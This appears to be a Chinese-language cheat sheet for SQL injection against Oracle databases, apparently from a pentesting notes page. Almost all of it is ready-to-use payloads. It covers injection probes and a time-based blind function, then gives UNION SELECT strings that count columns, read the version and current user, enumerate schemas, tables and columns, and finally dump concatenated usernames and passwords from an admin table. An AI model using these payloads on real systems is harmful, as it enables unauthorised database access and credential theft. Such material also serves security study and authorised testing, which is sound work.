java大企业使用居多。
注入点测试：

<https://xz.aliyun.com/t/8020?time__1311=n4%2BxuDgDBAeDqrgDlroGkzD8CDkYeDce4YupD&alichlgref=https%3A%2F%2Fcn.bing.com%2F>

1/0
1/1
exp(120)
1,1
1,0

oracle时间盲注函数：DBMS_PIPE.RECEIVE_MESSAGE

## 判断注入

```
and 1=1 --+
and 1=2 --+
```

## []()判断列数

```
order by 8 --+
```

## []()判断回显位置

```
' union select null,null,null,null,null,null,null,null from dual --+
```

## []()查看当前数据库版本

```
' union select 1,null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null from dual --+
```

## []()查询当前用户

```
' union select 1,null,(select user from dual),null,null,null,null,null from dual --+
```

## []()查看当前库名

```
' union select 1,null,(select owner from all_tables where rownum=1),null,null,null,null,null from dual --+
查询除已知的库中其他库
' union select 1,null,(select owner from all_tables where rownum=1 and owner <> '已知的数据库名'),null,null,null,null,null from dual --+
```

## []()查看表名

```
查看第一个表
    ' union select 1,null,(select table_name from user_tables where rownum=1),null,null,null,null,null from dual --+
查询除已知的表中其他表
    ' union select 1,null,(select table_name from user_tables where rownum=1 and table_name <> '已知的表名'),null,null,null,null,null from dual --+
```

## []()查询列名

```
查询第一列名
     ' union select 1,null,(select column_name from user_tab_columns where table_name='表名' and rownum=1),null,null,null,null,null from dual --+
查询除已知的表中其他表
     ' union select 1,null,(select column_name from user_tab_columns where table_name='表名' and rownum=1 and column_name <> '已知的列名'),null,null,null,null,null from dual --+
```

## []()查询数据

```
' union select 1,null,(select concat(username,password) from admin),null,null,null,null,null from dual --+
```

